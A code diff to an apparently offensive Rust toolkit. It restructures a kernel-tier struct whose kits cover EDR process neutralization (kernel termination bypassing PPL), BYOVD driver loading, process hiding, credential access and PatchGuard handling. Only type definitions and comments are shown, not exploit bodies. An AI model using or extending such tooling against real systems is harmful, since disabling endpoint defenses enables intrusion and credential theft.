@@ -236,6 +236,7 @@ pub trait WfpKit {
 }
 
 /// §2.5 — EDR process neutralization. Three noise tiers.
+#[derive(Debug, Clone, Copy)]
 pub enum NeutralizeMethod {
     /// Kernel `ZwTerminateProcess` (bypasses PPL). Highest noise + finality.
     Kill,
@@ -403,15 +404,23 @@ impl CredKit for NoKernel {
 // ---- §6 Assembled tier ----------------------------------------------------
 
 /// An engagement's kernel tier, assembled at runtime after the operator picks a
-/// bootstrap path. `rw` is required; the rest are optional and degrade to
-/// `NoKernel`-equivalent behavior when `None`.
+/// bootstrap path. `rw` is the LIVE kernel primitive (moved out of the
+/// `KernelBootstrap` by `assemble_tier`); the rest are optional kits that
+/// degrade to `None` when their required offsets aren't resolved.
+///
+/// `loaded_driver` holds the BYOVD `LoadedDriver` (for explicit `unload()` by
+/// the operator). It does NOT auto-unload on drop (by design — see
+/// `LoadedDriver`'s Drop). KslD path leaves this `None`.
+///
+/// PG windows are NOT stored here (they borrow `&dyn KernelRw` for their
+/// repair callback and can't outlive `rw`). Use `select_pg_window(build,
+/// &*tier.rw)` at the call site.
 pub struct KernelTier {
     pub rw: Box<dyn KernelRw>,
     pub etw_ti: Option<Box<dyn EtwTiKit>>,
     pub callbacks: Option<Box<dyn CallbackKit>>,
     pub minifilter: Option<Box<dyn MiniFilterKit>>,
     pub wfp: Option<Box<dyn WfpKit>>,
-    pub pg: Option<Box<dyn PatchGuardKit>>,
     pub hide: Option<Box<dyn ProcHideKit>>,
     pub ppl: Option<Box<dyn PplKit>>,
     pub cred: Option<Box<dyn CredKit>>,
@@ -419,6 +428,10 @@ pub struct KernelTier {
     /// primitive via `EdrNeutralizer::kill(krw, pid)` directly; Freeze/Choke
     /// are user-mode tiers that run real FFI when this is `Some`.
     pub neutralize: Option<Box<dyn EdrNeutralizeKit>>,
+    /// BYOVD loaded driver (for explicit unload). Opaque `Send+Sync` box so the
+    /// non-cfg-gated `KernelTier` (defined here in lib.rs) can hold the
+    /// Windows-only `LoadedDriver`. `None` for KslD path.
+    pub loaded_driver: Option<Box<dyn Send + Sync>>,
 }
 
 impl KernelTier {
@@ -430,11 +443,11 @@ impl KernelTier {
             callbacks: None,
             minifilter: None,
             wfp: None,
-            pg: None,
             hide: None,
             ppl: None,
             cred: None,
             neutralize: None,
+            loaded_driver: None,
         }
     }
 }
